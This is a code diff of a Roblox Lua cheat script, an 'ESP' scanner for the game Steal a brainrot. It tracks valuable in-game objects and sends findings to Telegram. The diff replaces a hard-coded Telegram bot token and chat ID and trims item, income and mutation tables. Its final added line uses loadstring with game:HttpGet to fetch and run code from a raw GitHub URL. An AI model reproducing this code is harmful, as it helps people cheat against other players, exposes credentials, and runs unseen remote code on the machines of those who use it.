@@ -31,8 +31,8 @@ local SCANNER_SETTINGS = {
 
 -- Настройки Telegram ботов
 local TG_MAIN = {
-    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
-    ChatId = "1072158346",
+    Token = "8481723992:AAH1a-E26i8XT5Y-MAcFqMoCzdUea5LWrh8",
+    ChatId = "5263524993",
     Enabled = true,
     ImportantObjects = {
         ["Pot Hotspdddot"] = true,
@@ -59,10 +59,7 @@ local TG_MAIN = {
         ["Tacorita Bicicleta"] = true,
         ["Tictac Sahur"] = true,
         ["Celularcini Visiosini"] = true,
-        ["Chicleteira Bicicleteira"] = true,
-        ["Los Primos"] = true,
-        ["Tang Tang Keletang"] = true,
-        ["Money Money Puggy"] = true
+        ["Chicleteira Bicicleteira"] = true
     }
 }
 
@@ -124,10 +121,7 @@ local OBJECT_INCOME = {
     ["Las Sis"] = "18M/s",
     ["Tacorita Bicicleta"] = "16.5M/s",
     ["Tictac Sahur"] = "37M/s",
-    ["Celularcini Visiosini"] = "22.5M/s",
-    ["Los Primos"] = "31M/s",
-    ["Tang Tang Keletang"] = "33.5M/s",
-    ["Money Money Puggy"] = "21M/s"
+    ["Celularcini Visiosini"] = "22.5M/s"
 }
 
 -- Множители мутаций и трейтов
@@ -138,8 +132,7 @@ local MUTATION_MULTIPLIERS = {
     ["Bloodrot"] = 2,
     ["Candy"] = 4,
     ["Lava"] = 6,
-    ["Galaxy"] = 7,
-    ["Yin Yang"] = 7
+    ["Galaxy"] = 6
 }
 
 local TRAIT_MULTIPLIERS = {
@@ -206,10 +199,7 @@ local OBJECT_EMOJIS = {
     ["Las Sis"] = "👧",
     ["Tacorita Bicicleta"] = "🌮",
     ["Tictac Sahur"] = "🕰️",
-    ["Celularcini Visiosini"] = "📞",
-    ["Los Primos"] = "🙆‍♂️",
-    ["Tang Tang Keletang"] = "📢",
-    ["Money Money Puggy"] = "🐶"
+    ["Celularcini Visiosini"] = "📞"
 }
 
 -- Эмодзи для мутаций
@@ -220,8 +210,7 @@ local MUTATION_EMOJIS = {
     ["Diamond"] = "💎",
     ["Candy"] = "🍬",
     ["Bloodrot"] = "🟥",
-    ["Galaxy"] = "🟪",
-    ["Yin Yang"] = "☯️"
+    ["Galaxy"] = "🟪"
 }
 
 -- Список объектов
@@ -260,10 +249,7 @@ local OBJECT_NAMES = {
     "Las Sis",
     "Tacorita Bicicleta",
     "Tictac Sahur",
-    "Celularcini Visiosini",
-    "Los Primos",
-    "Tang Tang Keletang",
-    "Money Money Puggy"
+    "Celularcini Visiosini"
 }
 
 -- Системные переменные
@@ -792,4 +778,4 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
